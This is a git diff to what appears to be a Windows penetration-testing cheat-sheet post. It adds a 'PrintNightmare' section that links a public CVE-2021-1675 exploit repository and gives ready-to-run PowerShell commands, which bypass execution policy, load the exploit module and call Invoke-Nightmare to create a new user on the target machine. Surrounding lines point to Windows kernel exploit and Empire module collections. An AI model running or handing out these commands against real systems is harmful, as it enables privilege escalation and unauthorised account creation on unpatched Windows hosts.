@@ -17,8 +17,6 @@ layout: post
   ///
  ///
 ///
-
-
 ###### Start Process with PowerShell
 ```
 How to use powershell to pop a second shell
@@ -139,4 +137,13 @@ https://github.com/SecWiki/windows-kernel-exploits
 
 Empire
 https://github.com/EmpireProject/Empire/tree/master/data/module_source
+```
+
+###### PrintNightmare
+```
+https://github.com/calebstewart/CVE-2021-1675/
+
+Run with (in powershell):
+> powershell -exec bypass -command "& { Import-Module .\CVE-2021-1675.ps1; Invoke-Nightmare; }"
+> Invoke-Nightmare -NewUser "username" -NewPassword "password" -DriverName "PrintMe"
 ```
